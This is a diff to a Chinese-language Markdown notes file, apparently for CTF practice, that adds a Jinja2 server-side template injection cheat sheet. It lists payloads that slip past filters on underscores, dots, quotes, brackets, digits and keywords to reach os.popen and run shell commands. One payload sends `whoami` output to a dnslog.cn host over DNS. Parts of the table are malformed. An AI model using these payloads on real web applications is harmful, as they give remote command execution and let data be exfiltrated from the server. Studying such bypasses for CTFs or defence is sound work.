@@ -12,11 +12,56 @@
 
 ## ssti bypass
 
-| code                   | filter | bypass                      |
-| ---------------------- | ------ | --------------------------- |
-| `__init__.__globals__` | global | `__init__['__glob''als__']` |
-| `{{}}`                 | `{{`   | `{% %}`                     |
-|                        | `_`    | lipsum                      |
+| blacklist 过滤 | symbol                                                                      | bypass                                                                                                                                                                                                                    |
+| -------------- | --------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------ | --------------------------- |
+| global         | `''` 引号拼接                                                               | `__init__['__glob''als__']`                                                                                                                                                                                               |
+| `{{`           | `{% %}`                                                                     | `{%print(url_for.__globals__['os']['popen']('ls').read())%}` <br> `` {% if url_for.__globals__['os']['popen']('ping `whoami`.kfa554.dnslog.cn').read()=='a' %}1{% endif %} ``                                             |
+| `[,]`          |                                                                             | `{{url_for.__globals__.os.popen('ls').read()}}`                                                                                                                                                                           |
+| `',"`          | request.values.v1                                                           | 用 burp 发 `{{url_for.__globals__.os.popen(request.values.v1).read()}}&v1=ls`                                                                                                                                             |
+|                | `chr()` chr 绕过                                                            | 先找到 chr 再使用 `{{url_for.__globals__.__builtins__.chr}}`<br>`{% set chr=url_for.__globals__.__builtins__.chr%}{{url_for.__globals__.os.popen(chr(108)+chr(115)).read()}}`                                             |
+|                | `__getitem__()`                                                             |
+| `_`            | `\x5f` 16 进制绕过 <br>`\137` 8 进制绕过                                    | `{{lipsum['\x5f\x5fglobals\x5f\x5f'].os.popen('ls').read()}}` <br> `{{lipsum['\137\137globals\137\137'].os.popen('ls').read()}}`                                                                                          |
+| `.` 点         | 1. `[]`中括号绕过 <br>2.`attr()`绕过                                        | `{{url_for['__globals__']['os']['popen']('ls')['read']()}}` 列表/字典 不能 attr(139)，要`attr('__getitem__')(139)` <br> `{{lipsum\|attr('__globals__')\|attr('__getitem__')('os')\|attr('popen')('ls')\|attr('read')()}}` |
+| `.` 点         |                                                                             |                                                                                                                                                                                                                           |
+| 关键字过滤     | 1.字符串拼接绕过 <br>2.单双引号绕过<br> 3.编码绕过 8/16 进制/unicode/base64 | `{{''['__cl'+'ass__']}}` <br> `{{''['__cl''ass__']}}`                                                                                                                                                                     |
+| 数字过滤       | [数字过滤](#数字过滤)                                                       | `{%set zero=([]                                                                                                                                                                                                           | string | list).index('[')%}{{zero}}` |
+
+### 数字过滤
+
+1. 用循环找到能利用的类直接用
+
+```python
+{% for i in ''.__class__.__base__.__subclasses__() %}{% if i.__name__=='Popen' %}{{ i.__init__.__globals__.__getitem__('os').popen('cat flag').read()}}{% endif %}{% endfor %}
+```
+
+2. 用 lipsum 不通过数字直接利用
+
+```python
+{{lipsum|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("cat flag")|attr("read")()}}
+```
+
+3.直接拼接
+
+```py
+{%set zero=([]|string|list).index('[')%}
+{%set one=dict(a=a)|join|count%}
+{%set two=dict(aa=a)|join|count%}
+{%set three=dict(aaa=a)|join|count%}
+{%set four=dict(aaaa=a)|join|count%}
+{%set five=dict(aaaaa=a)|join|count%}
+{%set six=dict(aaaaaa=a)|join|count%}
+{%set seven=dict(aaaaaaa=a)|join|count%}
+{%set eight=dict(aaaaaaaa=a)|join|count%}
+{%set nine=dict(aaaaaaaaa=a)|join|count%}
+# 拼接为140
+{% set num=(one~four~zero)|int %}
+# 最终payload
+{%set one=dict(a=a)|join|count%}
+{%set four=dict(aaaa=a)|join|count%}
+{%set zero=([]|string|list).index('[')%}
+{% set num=(one~four~zero)|int %}
+{{().__class__.__base__.__subclasses__()[num].__init__.__globals__['__builtins__']['__import__']('os').popen('ls').read()}}
+```
 
 ## ssti 注入
 
